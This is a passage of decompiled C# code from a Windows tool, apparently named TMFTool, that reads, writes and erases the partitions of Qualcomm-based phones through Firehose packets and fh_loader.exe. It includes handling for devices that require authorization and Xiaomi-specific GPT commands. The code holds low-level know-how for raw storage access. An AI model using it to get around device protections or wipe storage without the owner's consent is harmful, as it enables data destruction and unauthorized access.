		if (lang == "zh")
		{
			((Control)this.m_107).Text = $"耗时: {num} 分 {num2} 秒";
		}
		else
		{
			((Control)this.m_107).Text = $"Timer: {num} m {num2} s";
		}
	}

	private void _44()
	{
		((System.Windows.Forms.Timer)this.m_39).Stop();
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern SafeFileHandle CreateFile(string fileName, int desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool CloseHandle(SafeFileHandle handle);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern int ReadFile(SafeFileHandle handle, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 3)] byte[] bytes, int numBytesToRead, ref int numBytesRead, IntPtr overlapped_MustBeZero);

	[DllImport("kernel32.dll", SetLastError = true)]
	internal static extern int WriteFile(SafeFileHandle handle, byte[] bytes, int numBytesToWrite, out int numBytesWritten, IntPtr overlapped_MustBeZero);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern int GetFileSize(SafeFileHandle handle, ref long len);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern int ReadFile(SafeFileHandle handle, IntPtr bytesintptr, int numBytesToRead, ref int numBytesRead, IntPtr overlapped_MustBeZero);

	[DllImport("kernel32.dll")]
	private static extern bool PurgeComm(IntPtr hFile, uint dwFlags);

	public static void ClearPort(SafeFileHandle safeHandle)
	{
		PurgeComm(safeHandle.DangerousGetHandle(), 15u);
	}

	private async Task _46()
	{
		((List<RawPartition>)this.m_3e).Clear();
		object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				if (!((DataGridViewRow)obj).IsNewRow)
				{
					nint result = 0;
					if (((DataGridViewRow)obj).Cells["Check"].Value != null)
					{
						NativeValues.TryParseBoolean(((DataGridViewRow)obj).Cells["Check"].Value.ToString(), out result);
					}
					if ((int)result != 0)
					{
						object name = ((DataGridViewRow)obj).Cells["name"].Value?.ToString() ?? "";
						object file = ((DataGridViewRow)obj).Cells["filePath"].Value?.ToString() ?? "";
						object numsector = ((DataGridViewRow)obj).Cells["num"].Value?.ToString() ?? "";
						object start = ((DataGridViewRow)obj).Cells["star"].Value?.ToString() ?? "";
						object physicalNum = ((DataGridViewRow)obj).Cells["L"].Value?.ToString() ?? "";
						object sectorSize = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
						((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		object value = ((Control)this.m_126).Text.Trim();
		if (string.IsNullOrEmpty((string)value))
		{
			Msg("等待端口...100 秒");
			nint num = ((await _92(100u)) ? 1 : 0);
			IntPtr intPtr = num;
			if (intPtr != (IntPtr)0)
			{
				_3d(1u);
				if (this.m_11 != null && this.m_11 != this.m_c9)
				{
					((Button)this.m_11).PerformClick();
					this.m_11 = null;
				}
			}
		}
		else if (((Control)this.m_126).Text.Contains("COM"))
		{
			PortQcom = ((Control)this.m_126).Text;
			_4b();
		}
		else
		{
			MessageBox.Show("端口都没有进你虚空刷机吗", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			EnableButtons();
		}
	}

	private async Task _47()
	{
		((List<RawPartition>)this.m_3e).Clear();
		object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				if (((DataGridViewRow)obj).IsNewRow)
				{
					continue;
				}
				nint result = 0;
				if (((DataGridViewRow)obj).Cells["Check"].Value != null)
				{
					NativeValues.TryParseBoolean(((DataGridViewRow)obj).Cells["Check"].Value.ToString(), out result);
				}
				if (result != 0)
				{
					object obj2 = ((DataGridViewRow)obj).Cells["name"].Value?.ToString() ?? "";
					object file = ((DataGridViewRow)obj).Cells["filePath"].Value?.ToString() ?? "";
					object numsector = ((DataGridViewRow)obj).Cells["num"].Value?.ToString() ?? "";
					object start = ((DataGridViewRow)obj).Cells["star"].Value?.ToString() ?? "";
					object physicalNum = ((DataGridViewRow)obj).Cells["L"].Value?.ToString() ?? "";
					object sectorSize = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
					if (!((string)obj2 == "BackupGPT"))
					{
						((List<RawPartition>)this.m_3e).Add(new RawPartition((string)obj2, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		object value = ((Control)this.m_126).Text.Trim();
		if (string.IsNullOrEmpty((string)value))
		{
			Msg("等待端口...100 秒");
			nint num = ((await _92(100u)) ? 1 : 0);
			IntPtr intPtr = num;
			if (intPtr != (IntPtr)0)
			{
				_3d(1u);
				if (this.m_11 != null && this.m_11 != this.m_c9)
				{
					((Button)this.m_11).PerformClick();
					this.m_11 = null;
				}
			}
		}
		else if (((Control)this.m_126).Text.Contains("COM"))
		{
			PortQcom = ((Control)this.m_126).Text;
			_4b();
		}
		else
		{
			MessageBox.Show("端口都没有进你虚空刷机吗", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			EnableButtons();
		}
	}

	private async Task _4a()
	{
		((List<RawPartition>)this.m_3e).Clear();
		nint num = 0;
		object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				if (!((DataGridViewRow)obj).IsNewRow)
				{
					nint result = 0;
					if (((DataGridViewRow)obj).Cells["Check"].Value != null)
					{
						NativeValues.TryParseBoolean(((DataGridViewRow)obj).Cells["Check"].Value.ToString(), out result);
					}
					if ((int)result != 0)
					{
						int num2 = (int)num;
						num = num2 + 1;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		if (num > 20)
		{
			object start = "0";
			object sectorSize = "4096";
			object numsector = "6";
			nint num3 = 6;
			if (!((UIRadioButton)this.m_da).Checked)
			{
				num3 = 1;
				sectorSize = "512";
				numsector = "34";
			}
			nint num4 = 0;
			while (num4 < num3)
			{
				object name = $"gpt_main{(int)num4}";
				object physicalNum = ((int)num4).ToString();
				((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, "", "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
				int num2 = (int)num4;
				num4 = num2 + 1;
			}
		}
		object enumerator2 = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator2).MoveNext())
			{
				object obj2 = (DataGridViewRow)((IEnumerator)enumerator2).Current;
				if (((DataGridViewRow)obj2).IsNewRow)
				{
					continue;
				}
				nint result2 = 0;
				if (((DataGridViewRow)obj2).Cells["Check"].Value != null)
				{
					NativeValues.TryParseBoolean(((DataGridViewRow)obj2).Cells["Check"].Value.ToString(), out result2);
				}
				if (result2 != 0)
				{
					object obj3 = ((DataGridViewRow)obj2).Cells["name"].Value?.ToString() ?? "";
					object file = ((DataGridViewRow)obj2).Cells["filePath"].Value?.ToString() ?? "";
					object numsector2 = ((DataGridViewRow)obj2).Cells["num"].Value?.ToString() ?? "";
					object start2 = ((DataGridViewRow)obj2).Cells["star"].Value?.ToString() ?? "";
					object physicalNum2 = ((DataGridViewRow)obj2).Cells["L"].Value?.ToString() ?? "";
					if (!((string)obj3).Equals("BackupGPT", StringComparison.OrdinalIgnoreCase))
					{
						object sectorSize2 = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
						((List<RawPartition>)this.m_3e).Add(new RawPartition((string)obj3, (string)file, "", (string)start2, (string)sectorSize2, (string)numsector2, (string)physicalNum2, download: true));
					}
				}
			}
		}
		finally
		{
			if (enumerator2 is IDisposable disposable2)
			{
				disposable2.Dispose();
			}
		}
		object value = ((Control)this.m_126).Text.Trim();
		if (string.IsNullOrEmpty((string)value))
		{
			Msg("等待端口...100 秒");
			nint num5 = ((await _92(100u)) ? 1 : 0);
			IntPtr intPtr = num5;
			if (intPtr != (IntPtr)0)
			{
				_3d(1u);
				if (this.m_11 != null && this.m_11 != this.m_c9)
				{
					((Button)this.m_11).PerformClick();
					this.m_11 = null;
				}
			}
			return;
		}
		if (!string.IsNullOrEmpty(BACKUPFOLDER_Path))
		{
			object obj4 = Directory.GetParent(BACKUPFOLDER_Path)?.FullName;
			((Form)this).DialogResult = AntdUI.Modal.open((Form)(object)this, "是否按上次保存目录\n" + (string)obj4 + " \n进行保存？", "提示", (TType)3);
			if (((Form)this).DialogResult == DialogResult.OK)
			{
				object path = obj4;
				object path2 = "TMFTool_readback_" + DateTime.Now.ToString("yyyyMMddHHmmss");
				object obj5 = Path.Combine((string)path, (string)path2);
				if (!Directory.Exists((string)obj5))
				{
					Directory.CreateDirectory((string)obj5);
				}
				RAWCreator.CreatedRawProgram((List<RawPartition>)this.m_3e, (string)obj5);
				PortQcom = ((Control)this.m_126).Text;
				Msg("上次保存路径: ");
				fa();
				Msg((string)obj5 + "\n");
				_4b();
				return;
			}
			object obj6 = (object)new VistaFolderBrowserDialog();
			try
			{
				((VistaFolderBrowserDialog)obj6).Description = "请选择保存目录";
				((VistaFolderBrowserDialog)obj6).UseDescriptionForTitle = true;
				((VistaFolderBrowserDialog)obj6).ShowNewFolderButton = true;
				if (((CommonDialog)obj6).ShowDialog() == DialogResult.OK)
				{
					object selectedPath = ((VistaFolderBrowserDialog)obj6).SelectedPath;
					object path3 = "TMFTool_readback_" + DateTime.Now.ToString("yyyyMMddHHmmss");
					object bACKUPFOLDER_Path = Path.Combine((string)selectedPath, (string)path3);
					if (!Directory.Exists((string)bACKUPFOLDER_Path))
					{
						Directory.CreateDirectory((string)bACKUPFOLDER_Path);
					}
					BACKUPFOLDER_Path = (string)bACKUPFOLDER_Path;
					RAWCreator.CreatedRawProgram((List<RawPartition>)this.m_3e, BACKUPFOLDER_Path);
					PortQcom = ((Control)this.m_126).Text;
					Msg("路径: ");
					fa();
					Msg(BACKUPFOLDER_Path + "\n");
					_4b();
				}
				else
				{
					EnableButtons();
				}
			}
			finally
			{
				((IDisposable)obj6)?.Dispose();
			}
			return;
		}
		object obj7 = (object)new VistaFolderBrowserDialog();
		try
		{
			((VistaFolderBrowserDialog)obj7).Description = "请选择保存目录";
			((VistaFolderBrowserDialog)obj7).UseDescriptionForTitle = true;
			((VistaFolderBrowserDialog)obj7).ShowNewFolderButton = true;
			if (((CommonDialog)obj7).ShowDialog() == DialogResult.OK)
			{
				object selectedPath2 = ((VistaFolderBrowserDialog)obj7).SelectedPath;
				object path4 = "TMFTool_readback_" + DateTime.Now.ToString("yyyyMMddHHmmss");
				object bACKUPFOLDER_Path2 = Path.Combine((string)selectedPath2, (string)path4);
				if (!Directory.Exists((string)bACKUPFOLDER_Path2))
				{
					Directory.CreateDirectory((string)bACKUPFOLDER_Path2);
				}
				BACKUPFOLDER_Path = (string)bACKUPFOLDER_Path2;
				RAWCreator.CreatedRawProgram((List<RawPartition>)this.m_3e, BACKUPFOLDER_Path);
				PortQcom = ((Control)this.m_126).Text;
				Msg("路径: ");
				fa();
				Msg(BACKUPFOLDER_Path + "\n");
				_4b();
			}
			else
			{
				EnableButtons();
			}
		}
		finally
		{
			((IDisposable)obj7)?.Dispose();
		}
	}

	private async void _4b()
	{
		object obj = new _003C_003Ec__DisplayClass157_0();
		if (lang == "zh")
		{
			Msg("配置设备...");
		}
		else
		{
			Msg("Reading configuration...");
		}
		((_003C_003Ec__DisplayClass157_0)obj).ConRes = -2;
		object obj2 = new _003C_003Ec__DisplayClass157_1();
		((_003C_003Ec__DisplayClass157_1)obj2).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass157_0)obj;
		((_003C_003Ec__DisplayClass157_1)obj2).SepSl = new SerialPort(((Control)this.m_126).Text, 9600);
		try
		{
			object CS_0024_003C_003E8__locals7 = new _003C_003Ec__DisplayClass157_2();
			((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2 = (_003C_003Ec__DisplayClass157_1)obj2;
			try
			{
				((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.SepSl.Open();
			}
			catch
			{
				msgred();
				Msg("\n无法打开端口\n");
				EnableButtons();
				return;
			}
			object memName = "ufs";
			if (((UIRadioButton)this.m_d9).Checked)
			{
				memName = "emmc";
			}
			((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).xml = firehose_pkts.pkt_fhConfig1((string)memName);
			await Task.Run(async () =>
			{
				nint num = await LinQcPortClass.SendCon(((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.SepSl, ((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).xml);
				((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.ConRes = (int)num;
			});
			((_003C_003Ec__DisplayClass157_2)CS_0024_003C_003E8__locals7).CS_0024_003C_003E8__locals2.SepSl.Close();
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass157_1)obj2).SepSl != null)
			{
				((IDisposable)((_003C_003Ec__DisplayClass157_1)obj2).SepSl).Dispose();
			}
		}
		if (((_003C_003Ec__DisplayClass157_0)obj).ConRes == 1)
		{
			msgred();
			if (lang == "zh")
			{
				Msg("需要认证\n");
			}
			else
			{
				Msg("Authorization required\n");
			}
			OpenDisk(PortQcom);
			_2e();
			DiskClose();
		}
		else if (((_003C_003Ec__DisplayClass157_0)obj).ConRes == 0)
		{
			((Checkbox)this.m_109).Checked = true;
			fa();
			Msg("OK\n");
			if (this.m_47 == OpreationMain.WriteFlash)
			{
				if (WriteData.patchXMLList.Length != 0)
				{
				}
				((System.Windows.Forms.Timer)this.m_39).Start();
				this.m_3a = (IntPtr)0;
				OpenDisk(PortQcom);
				object obj4 = new BackgroundWorker();
				((BackgroundWorker)obj4).WorkerSupportsCancellation = true;
				((BackgroundWorker)obj4).DoWork += _54;
				((BackgroundWorker)obj4).RunWorkerAsync();
				((Component)obj4).Dispose();
			}
			else if (this.m_47 == OpreationMain.ReadFlash)
			{
				OpenDisk(PortQcom);
				object obj5 = new BackgroundWorker();
				((BackgroundWorker)obj5).WorkerSupportsCancellation = true;
				((BackgroundWorker)obj5).DoWork += _4c;
				((BackgroundWorker)obj5).RunWorkerAsync();
				((Component)obj5).Dispose();
			}
		}
		else if (((_003C_003Ec__DisplayClass157_0)obj).ConRes == 4)
		{
			fa();
			if (lang == "zh")
			{
				Msg("自由读写\n");
			}
			else
			{
				Msg("OK\n");
			}
			if (WriteData.patchXMLList.Length != 0)
			{
			}
			OpenDisk(PortQcom);
			((UIRadioButton)this.m_d9).Checked = true;
			if (this.m_47 == OpreationMain.WriteFlash)
			{
				((System.Windows.Forms.Timer)this.m_39).Start();
				this.m_3a = (IntPtr)0;
				((Control)this.m_107).Text = $"耗时: {0} 分 {0} 秒";
				object obj6 = new BackgroundWorker();
				((BackgroundWorker)obj6).WorkerSupportsCancellation = true;
				((BackgroundWorker)obj6).DoWork += _54;
				((BackgroundWorker)obj6).RunWorkerAsync();
				((Component)obj6).Dispose();
			}
			else if (this.m_47 == OpreationMain.ReadFlash)
			{
				object obj7 = new BackgroundWorker();
				((BackgroundWorker)obj7).WorkerSupportsCancellation = true;
				((BackgroundWorker)obj7).DoWork += _4c;
				((BackgroundWorker)obj7).RunWorkerAsync();
				((Component)obj7).Dispose();
			}
		}
		else
		{
			msgred();
			Msg("端口通讯错误！\n");
			EnableButtons();
		}
	}

	private async void _4c(object sender, object e)
	{
		if (_48 != READPartition.ReadGPT)
		{
			if (_48 == READPartition.ReadPart)
			{
				await Task.Delay(300);
				_4d();
				_49 = (IntPtr)1;
			}
			else if (_48 == READPartition.ErasePart)
			{
				await Task.Delay(300);
				_51();
				_49 = (IntPtr)0;
			}
			else
			{
				await Task.Delay(300);
				_4d();
				_49 = (IntPtr)1;
			}
		}
		Msg("\n");
		Msg("当前操作完成\n");
		DiskClose();
		if ((int)(nint)_49 != 0)
		{
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				((Form)this).DialogResult = AntdUI.Modal.open((Form)(object)this, "分区备份完成 \n" + BACKUPFOLDER_Path + " \n是否打开文件夹？", "提示", (TType)1);
			}));
			if (((Form)this).DialogResult == DialogResult.OK)
			{
				Process.Start("explorer.exe", BACKUPFOLDER_Path);
			}
		}
	}

	private void _4d()
	{
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			if (item.Name != "userdata")
			{
				string text = Path.Combine(BACKUPFOLDER_Path, item.Name + ".img");
				string fileName = Path.GetFileName(text);
				if (File.Exists(text))
				{
					Log2(fileName + " 文件存在已覆盖", Color.Red, isBold: false, newline: true);
					File.Delete(text);
				}
				long num = Convert.ToInt64(item.NumSector) * Convert.ToInt64(item.SectorSize);
				ulong.Parse(item.Start);
				Log2("[读取分区] ", Color.Black, isBold: false, newline: true);
				Log2(item.Name, Color.Black, isBold: false);
				Log2("..", Color.Black, isBold: false);
				if (_4f(item.Start, item.NumSector, item.PhysicalNum, item.SectorSize, Path.Combine(BACKUPFOLDER_Path, item.Name + ".img")) == 0)
				{
					Log2("Error", Color.Red, isBold: false);
					break;
				}
				Log2("OK", Color.DodgerBlue, isBold: false);
				if (this.m_4c)
				{
					EnableButtons();
					return;
				}
			}
		}
		if (((Checkbox)this.m_108).Checked)
		{
			Log2("重启设备...", Color.Black, isBold: false, newline: true);
			_56();
			Log2("OK", Color.DodgerBlue, isBold: false);
			((Checkbox)this.m_109).Checked = false;
		}
		EnableButtons();
	}

	private uint _4e(object start_sector, object num_sectors, object lun, object sectorSize, object filename, object log, object logs)
	{
		DiskClose();
		try
		{
			long num = (long)Math.Round(Conversions.ToDouble((string)num_sectors) * Conversions.ToDouble((string)sectorSize));
			string fileNameOnly = Path.GetFileName((string)filename);
			string directoryName = Path.GetDirectoryName((string)filename);
			string fileName = "C:\\TMFTool\\fh_loader.exe";
			string arguments = "--port=\\\\.\\" + PortQcom + " --sendimage=\"" + fileNameOnly + "\" --lun=" + (string)lun + " --start_sector=" + (string)start_sector + " --num_sectors=" + (string)num_sectors + " --mainoutputdir=\"" + directoryName + "\" --memoryname=" + (string)this.m_1f + " --noprompt --convertprogram2read --loglevel=2";
			if (this.m_47 == OpreationMain.ACC)
			{
				fileNameOnly = "Data";
			}
			Process process = new Process();
			process.StartInfo.FileName = fileName;
			process.StartInfo.Arguments = arguments;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.CreateNoWindow = true;
			long readBytes = 0L;
			long totalBytes = (long)Math.Round(Conversions.ToDouble((string)num_sectors) * Conversions.ToDouble((string)sectorSize));
			DateTime lastUpdateTime = DateTime.Now;
			long lastBytes = 0L;
			process.OutputDataReceived += (object sender, DataReceivedEventArgs e) =>
			{
				if (!string.IsNullOrEmpty(e.Data))
				{
					Match match = Regex.Match(e.Data, "CHANNEL DATA \\((\\d+) bytes\\)");
					if (match.Success)
					{
						long num2 = long.Parse(match.Groups[1].Value);
						readBytes += num2;
						DateTime now = DateTime.Now;
						TimeSpan timeSpan = now - lastUpdateTime;
						if (timeSpan.TotalSeconds >= 0.1)
						{
							long num3 = readBytes - lastBytes;
							double speedMBs = (double)num3 / 1024.0 / 1024.0 / timeSpan.TotalSeconds;
							lastUpdateTime = now;
							lastBytes = readBytes;
							((Control)this).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
							{
								((Control)this.m_cd).Text = $"{speedMBs:0.00} MB/s";
							}));
						}
						((Control)this).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
						{
							((Control)this.m_cf).Text = "Reading " + fileNameOnly + " [" + (string)_16b(readBytes) + "/" + (string)_16b(totalBytes) + "]";
							double num4 = (double)readBytes / (double)totalBytes;
							((UIProcessBar)this.m_c1).Maximum = 10000;
							((UIProcessBar)this.m_c1).Value = Math.Min(10000, (int)(num4 * 10000.0));
						}));
					}
				}
			};
			process.Start();
			process.BeginOutputReadLine();
			process.BeginErrorReadLine();
			process.WaitForExit();
			return (process.ExitCode == 0) ? 1u : 0u;
		}
		catch (Exception ex)
		{
			Msg("[异常] " + ex.Message);
			return 0u;
		}
	}

	private uint _4f(object start_sector, object num_sectors, object lun, object sectorSize, object filename)
	{
		string directoryName = Path.GetDirectoryName((string)filename);
		string log = Path.Combine(directoryName, "port_trace.txt");
		string logs = Path.Combine(directoryName, "command_trace.txt");
		this.m_4c = false;
		if (((Checkbox)this.m_142).Checked)
		{
			bool flag = (byte)_4e(start_sector, num_sectors, lun, sectorSize, filename, log, logs) != 0;
			File.Delete(log);
			File.Delete(logs);
			if (flag)
			{
				return 1u;
			}
			return 0u;
		}
		((Stopwatch)this.m_4b).Start();
		string text = Path.GetFileName((string)filename);
		string text2 = firehose_pkts.pkt_read(Conversions.ToInteger((string)sectorSize), Conversions.ToInteger((string)num_sectors), Conversions.ToInteger((string)lun), (string)start_sector);
		string logPath = "C:\\TMFTool\\log.txt";
		if (this.m_47 == OpreationMain.ACC)
		{
			text = "Data";
		}
		long num = (long)Math.Round(Conversions.ToDouble((string)num_sectors) * Conversions.ToDouble((string)sectorSize));
		_50(logPath, "发送" + text2);
		_50(logPath, "开始读取分区: " + text + ", 起始: " + (string)start_sector + ", 扇区数: " + (string)num_sectors + ", LUN: " + (string)lun);
		FileStream fileStream = new FileStream((string)filename, FileMode.Create, FileAccess.Write);
		using (fileStream)
		{
			SendXmlDISK(text2);
			byte[] array = new byte[0];
			byte[] array2 = new byte[0];
			bool flag2 = true;
			bool flag3 = false;
			bool flag4 = false;
			long num2 = 0L;
			do
			{
				Thread.Sleep(10);
				array2 = DiskRead();
				if (array2.Length == 0)
				{
					((Stopwatch)this.m_4b).Stop();
					((Stopwatch)this.m_4b).Reset();
					return 0u;
				}
				int num3 = array2.Length;
				if (flag2)
				{
					string text3 = Encoding.ASCII.GetString(array2);
					if (text3.Contains("response value"))
					{
						if (!text3.Contains("response value=\"ACK\" rawmode=\"true\""))
						{
							_50(logPath, "未检测到目标设备返回 ACK。");
							((Stopwatch)this.m_4b).Stop();
							((Stopwatch)this.m_4b).Reset();
							return 0u;
						}
						int startIndex = text3.IndexOf("response value=\"ACK\" rawmode=\"true\"");
						int num4 = text3.IndexOf("</data>", startIndex);
						flag2 = false;
						flag4 = true;
						array2 = array2.Skip(num4 + 7).ToArray();
						num3 = array2.Length;
					}
				}
				else
				{
					flag4 = true;
				}
				if (num3 - 210 > 0)
				{
					byte[] array3 = new byte[240];
					Array.Copy(array2, num3 - 240, array3, 0, 240);
					string text4 = Encoding.ASCII.GetString(array3);
					if (text4.Contains("response value=\"ACK\" rawmode=\"false\""))
					{
						int num5 = text4.IndexOf("<?xml version=\"1.0\"");
						flag3 = true;
						num3 -= 240 - num5;
						byte[] array4 = new byte[num3];
						Array.Copy(array2, 0, array4, 0, num3);
						array2 = array4;
					}
				}
				if ((num3 > 0) & flag4)
				{
					fileStream.Write(array2, 0, num3);
					num2 += num3;
					ProcessBar2(num2, num, "Reading " + text);
				}
			}
			while (!flag3 && num2 < num);
		}
		((Stopwatch)this.m_4b).Stop();
		((Stopwatch)this.m_4b).Reset();
		return 1u;
	}

	private void _50(object logPath, object message)
	{
		try
		{
			using StreamWriter streamWriter = new StreamWriter((string)logPath, append: true);
			streamWriter.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {message}");
		}
		catch (Exception ex)
		{
			Msg("写入日志失败：" + ex.Message);
		}
	}

	private void _51()
	{
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			long num = Convert.ToInt64(item.NumSector) * Convert.ToInt64(item.SectorSize);
			ulong.Parse(item.Start);
			Log2("[擦除分区] ", Color.Black, isBold: false, newline: true);
			Log2(item.Name, Color.Black, isBold: false);
			Log2("..", Color.Black, isBold: false);
			if (ErasePartDisk(item.SectorSize, item.NumSector, item.PhysicalNum, item.Start))
			{
				Log2("OK", Color.DodgerBlue, isBold: false);
				if (this.m_4c)
				{
					EnableButtons();
					return;
				}
				continue;
			}
			Log2("Error", Color.Red, isBold: false);
			break;
		}
		if (((Checkbox)this.m_108).Checked)
		{
			Log2("重启设备...", Color.Black, isBold: false, newline: true);
			_56();
			Log2("OK", Color.DodgerBlue, isBold: false);
			((Checkbox)this.m_109).Checked = false;
		}
		EnableButtons();
	}

	public bool ErasePartDisk(string SectSize, string numPartSect, string PhysicalPartition, string startSector)
	{
		this.m_4c = false;
		int num = 1048576;
		int num2 = 16384;
		long num3 = ((Conversions.ToDouble(numPartSect) * Conversions.ToDouble(SectSize) < (double)num) ? Conversions.ToLong(numPartSect) : ((long)Math.Round((double)num / Conversions.ToDouble(SectSize))));
		if (Conversions.ToDouble(numPartSect) == 0.0)
		{
			num3 = (long)Math.Round((double)num / Conversions.ToDouble(SectSize));
		}
		double num4 = (double)num3 * Conversions.ToDouble(SectSize);
		long num5 = 0L;
		long num6 = 0L;
		int num7 = 0;
		SendXmlDISK(firehose_pkts.pkt_Program(SectSize, num3.ToString(), PhysicalPartition, startSector));
		if (!IsAckDisk())
		{
			return false;
		}
		try
		{
			while ((double)num5 != num4)
			{
				if (num4 - (double)num5 < (double)num2)
				{
					num2 = (int)Math.Round(num4 - (double)num5);
				}
				byte[] array = new byte[num2];
				DiskWrite(array);
				num5 += array.Length;
				num6 += array.Length;
				num7++;
			}
			return IsAckDisk();
		}
		catch (Exception ex)
		{
			int num8 = (int)Interaction.MsgBox(ex.ToString());
			return false;
		}
	}

	private void _53(object sender, object e)
	{
		BackgroundWorker backgroundWorker = sender as BackgroundWorker;
		if (((AsyncCompletedEventArgs)e).Cancelled)
		{
			Msg("\n");
			msgred();
			Msg("用户终止刷机操作!\n");
			_44();
			((Control)this.m_e7).Enabled = true;
			EnableButtons();
		}
		else if (((AsyncCompletedEventArgs)e).Error != null)
		{
			Log2("发生错误: " + ((AsyncCompletedEventArgs)e).Error.Message, Color.Red, isBold: true);
			EnableButtons();
		}
		else
		{
			EnableButtons();
		}
		backgroundWorker.Dispose();
	}

	private void _54(object sender, object e)
	{
		falseButtons();
		BackgroundWorker backgroundWorker = sender as BackgroundWorker;
		if ((WriteData.patchXMLList.Length != 0) & ((UIRadioButton)this.m_da).Checked)
		{
			string xml = string.Format(Firehose.SetBootPartition, "1");
			if (lang == "zh")
			{
				Log2("设置启动分区... ", Color.Black, isBold: false, newline: true);
			}
			else
			{
				Log2("Set BootSlot 1... ", Color.Black, isBold: false, newline: true);
			}
			SendXmlDISK(xml);
			Log2("OK", Color.DodgerBlue, isBold: false);
		}
		string text = ((Control)this.m_10a).Text;
		if (text.Contains("小米") && ((List<string>)this.m_73).Count > 0)
		{
			foreach (string item in (List<string>)this.m_73)
			{
				Log2("设置GPT" + item + "...", Color.Black, isBold: false, newline: true);
				string xml2 = string.Format(Firehose.XBLGPT, item);
				SendXmlDISK(xml2);
				Log2("OK", Color.DodgerBlue, isBold: false);
			}
		}
		long num = 0L;
		foreach (RawPartition item2 in (List<RawPartition>)this.m_3e)
		{
			if (!File.Exists(item2.File))
			{
				Msg("\n");
				msgred();
				Msg("[错误] " + item2.Name + " 分区写入失败 需写入的镜像文件不存在！");
				((Stopwatch)this.m_4b).Reset();
				continue;
			}
			using FileStream fileStream = File.OpenRead(item2.File);
			num += fileStream.Length;
			int size = Marshal.SizeOf<SparseImageHeader>(default);
			int n = 0;
			long num2 = 0L;
			long num3 = num2 + ((SparseImageHeader)CommandFormat.BytesToStuct(GetBytesFromFile(fileStream, num2, size, out n), typeof(SparseImageHeader))).uFileHeaderSize;
			string fileName = Path.GetFileName(item2.File);
			if (item2.Start.Contains("NUM"))
			{
				if (lang == "zh")
				{
					Log2("[写入文件] ", Color.Black, isBold: false, newline: true);
				}
				else
				{
					Log2("[Writing] ", Color.Black, isBold: false, newline: true);
				}
				Log2("[" + item2.PhysicalNum + "] ", Color.Black, isBold: false);
				Log2(fileName, Color.Black, isBold: false);
				Log2(" > ", Color.Black, isBold: false);
				Log2(item2.Name, Color.DimGray, isBold: false);
				Log2("... ", Color.Black, isBold: false);
				((Stopwatch)this.m_4b).Start();
				if (_5a(item2.SectorSize, item2.NumSector, item2.PhysicalNum, item2.Start, item2.File) != 0)
				{
					Log2("OK", Color.DodgerBlue, isBold: false);
					((Stopwatch)this.m_4b).Reset();
					if (this.m_4c)
					{
						Log2("用户停止写入操作!", Color.Red, isBold: true, newline: true);
						((Stopwatch)this.m_4b).Stop();
						DiskClose();
						EnableButtons();
						((System.Windows.Forms.Timer)this.m_39).Stop();
						return;
					}
				}
				else
				{
					Log2("Error", Color.Red, isBold: true);
					((Stopwatch)this.m_4b).Reset();
					if (this.m_4c)
					{
						Log2("用户停止写入操作!", Color.Red, isBold: true, newline: true);
						((Stopwatch)this.m_4b).Stop();
						DiskClose();
						EnableButtons();
						((System.Windows.Forms.Timer)this.m_39).Stop();
						return;
					}
				}
				continue;
			}
			ulong.Parse(item2.Start);
			if (lang == "zh")
			{
